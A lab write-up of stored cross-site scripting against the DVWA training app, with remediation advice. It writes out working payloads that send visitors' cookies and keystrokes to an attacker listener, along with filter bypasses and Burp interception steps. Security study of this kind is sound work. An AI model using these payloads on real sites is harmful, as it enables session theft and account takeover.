# Lab Write-Up: Cross-Site Scripting – Stored (XSS)
**Date:** 2026-08-24  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Cross-Site Scripting (XSS)  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

Stored Cross-Site Scripting (also called Persistent XSS) is a more dangerous variant of XSS where the malicious payload is permanently saved on the server (e.g., in a database) and executed every time any user loads the affected page. Unlike Reflected XSS, the victim does not need to click a crafted link — simply visiting the page triggers the payload.

**Goal of this lab:** Inject a persistent JavaScript payload into the DVWA guestbook, causing it to execute for every visitor and exfiltrate their session cookies.

---

## 2. Environment Setup

| Component        | Details                                 |
|------------------|-----------------------------------------|
| **Target App**   | DVWA – XSS (Stored) Module              |
| **Attacker OS**  | Kali Linux                              |
| **Tools Used**   | Browser, Burp Suite, Python HTTP Server |
| **Network**      | Local lab (NAT/Host-Only)               |
| **Listener**     | `python3 -m http.server 8081`           |

**Start your cookie listener:**
```bash
python3 -m http.server 8081
```

---

## 3. Vulnerability Overview

### What is Stored XSS?

Stored XSS occurs when user-submitted data is saved to the server without sanitization and later rendered in a web page. The critical difference from Reflected XSS:

| Feature             | Reflected XSS       | Stored XSS              |
|---------------------|---------------------|-------------------------|
| Payload stored?     | No                  | Yes (database/file)     |
| Victim interaction  | Must click a link   | Just visit the page     |
| Persistence         | One-time            | Until entry is deleted  |
| Impact              | High                | Critical                |

**Vulnerable Code (PHP – Low Level):**
```php
$message = $_POST['mtxMessage'];
// Stored directly to DB without sanitization
mysql_query("INSERT INTO guestbook (comment) VALUES ('$message')");
// Later rendered:
echo $row['comment'];
```

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → XSS (Stored). Set security to **Low**.

**Observation:** A guestbook with "Name" and "Message" fields. Comments are stored in the database and displayed to all visitors.

#### Step 1 – Test Normal Behavior

- Name: `Adinath`
- Message: `Hello World`

**Result:** Comment is saved and displayed on the page.

#### Step 2 – HTML Injection Test

**Message payload:**
```html
<h1>Hacked</h1>
```

**Result:** Page renders `<h1>` as actual HTML — confirms no output encoding.

#### Step 3 – Basic Script Injection

**Message payload:**
```html
<script>alert('Stored XSS')</script>
```

**Result:** Every time the page loads, the alert fires — this confirms **Stored XSS**.

#### Step 4 – Cookie Stealing Payload

**Name:** `Attacker`

**Message payload:**
```html
<script>new Image().src='http://192.168.x.x:8081/?cookie='+document.cookie</script>
```

**Result in listener terminal:**
```
"GET /?cookie=PHPSESSID=abc123xyz;security=low HTTP/1.1" 200
```

✅ Cookie stolen from every visitor who loads the page.

#### Step 5 – Keylogger Payload (Advanced)

```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://192.168.x.x:8081/?key=' + String.fromCharCode(e.which);
}
</script>
```

**Result:** Every keystroke the visitor types is sent to the attacker's listener.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The `<script>` tag appears to be filtered in the Message field. The Name field has a `maxlength="10"` attribute in the HTML.

#### Step 1 – Test Script Tag (Blocked)

**Payload:**
```html
<script>alert(1)</script>
```

**Result:** Filtered — no alert fires.

#### Step 2 – Bypass via Name Field (Client-Side maxlength)

The `maxlength="10"` restriction is **client-side only**. Use Burp Suite to intercept and modify the Name field:

1. Open Burp Suite → enable Intercept
2. Fill in the form and click Submit
3. Catch the POST request in Burp
4. Modify the `txtName` parameter to inject a payload:

**Payload in Name field (via Burp):**
```html
<script>alert(1)</script>
```

**Result:** Alert fires — the Name field has no server-side length restriction.

#### Step 3 – Cookie Stealing via Burp

Modify the `txtName` field in Burp:
```html
<script>new Image().src='http://192.168.x.x:8081/?c='+document.cookie</script>
```

**Result:** Cookie exfiltrated for each visitor.

#### Step 4 – Bypass Message Field Filter

If targeting the Message field, use the SVG bypass:
```html
<svg onload=alert(document.cookie)>
```

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** Stricter filtering using regex. `<script>` and many variations are blocked in the Message field.

#### Step 1 – Exploit the Name Field Again (via Burp)

The Name field still doesn't have adequate server-side filtering. Use Burp to bypass `maxlength`:

**Payload (Name field via Burp):**
```html
<img src=x onerror=alert(document.cookie)>
```

**Result:** Alert fires with the cookie.

#### Step 2 – Full Persistence Attack

**Payload (Name field via Burp):**
```html
<img src=x onerror=new Image().src='http://192.168.x.x:8081/?c='+document.cookie>
```

**Result:** Every visitor's cookie is sent to the attacker — indefinitely until the entry is deleted.

---

## 5. Stored XSS Attack Scenario

```
1. Attacker submits payload to guestbook
2. Payload is stored in DVWA database
3. User A visits the guestbook page → cookie stolen
4. User B visits the guestbook page → cookie stolen
5. Admin visits the guestbook page → cookie stolen
6. All stolen sessions can be used for account takeover
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Vector Used            | Persistence |
|----------------|------------|------------------------|-------------|
| Low            | ✅ Yes     | Message field (direct) | Yes         |
| Medium         | ✅ Yes     | Name field via Burp    | Yes         |
| High           | ✅ Yes     | Name field via Burp    | Yes         |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.0      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Medium |

**Business Impact:**
- Mass session hijacking — affects ALL visitors, not just those who click a link
- Admin account compromise through persistent payload
- Complete data exposure and account takeover
- Reputational damage to the organization

---

## 8. Remediation Recommendations

| Fix                           | Description                                                        |
|-------------------------------|--------------------------------------------------------------------|
| **Output Encoding**           | Use `htmlspecialchars()` on ALL output from the database           |
| **Input Validation**          | Strip or reject HTML tags on input (whitelist approach)            |
| **Server-Side Length Limits** | Enforce character limits server-side, not just in HTML attributes  |
| **Content Security Policy**   | Strict CSP to block unauthorized script execution                  |
| **HttpOnly Cookie Flag**      | Prevents JS from reading session cookies                           |
| **Prepared Statements**       | Also prevents stored XSS via SQL injection as the storage vector   |

**Secure Code Fix (PHP):**
```php
// Vulnerable output
echo $row['comment'];

// Secure
echo htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8');
```

---

## 9. References

- [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger – Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [DVWA XSS Stored – Oyee Coder](https://oyeecoder.blogspot.com/2023/01/dvwa-damn-vulnerable-web-application_31.html)
- [DVWA XSS Solution – GitHub](https://github.com/kashrathod19/XSS-DVWA-SOLUTION)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – XSS (Stored) / Guestbook Module
Payload:   <script>new Image().src='http://ATTACKER:8081/?c='+document.cookie</script>
Result:    Persistent payload stored in DB, executes for ALL visitors
Impact:    Mass session cookie theft → account takeover
Severity:  CRITICAL
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
